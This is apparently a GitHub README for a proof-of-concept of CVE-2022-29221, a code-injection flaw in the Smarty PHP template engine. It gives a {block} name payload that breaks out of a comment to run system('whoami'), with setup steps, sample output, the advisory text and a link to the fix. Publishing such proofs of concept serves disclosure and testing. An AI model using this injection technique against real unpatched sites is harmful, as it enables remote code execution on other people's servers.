# CVE-2022-29221-PoC
This is a very basic Smarty sceleton app with a single template that shows the Proof of Concept code for CVE-2022-29221.

Injection Example Code:
```
{block name="poc*/system('whoami');/*"}ABC{/block}
```
See: https://github.com/sbani/CVE-2022-29221-PoC/blob/main/template/index.tpl

After running the code, Smarty will add a new php file in the `./compile/` folder. You can see the resulting (and vulnerable) code there.

## Run test

Install:
```
git clone git@github.com:sbani/CVE-2022-29221-PoC.git
cd CVE-2022-29221-PoC
composer install
```

Run:
```
❯ whoami
sbani
❯ php index.php
sbani
sbani
ABC
```

## CVE details
> Smarty is a template engine for PHP, facilitating the separation of presentation (HTML/CSS) from application logic. Prior to versions 3.1.45 and 4.1.1, template authors could inject php code by choosing a malicious {block} name or {include} file name. Sites that cannot fully trust template authors should upgrade to versions 3.1.45 or 4.1.1 to receive a patch for this issue. There are currently no known workarounds.

Fix commit is here:
- https://github.com/smarty-php/smarty/commit/64ad6442ca1da31cefdab5c9874262b702cccddd


References:
- https://nvd.nist.gov/vuln/detail/CVE-2022-29221
- https://github.com/smarty-php/smarty/security/advisories/GHSA-634x-pc3q-cf4c
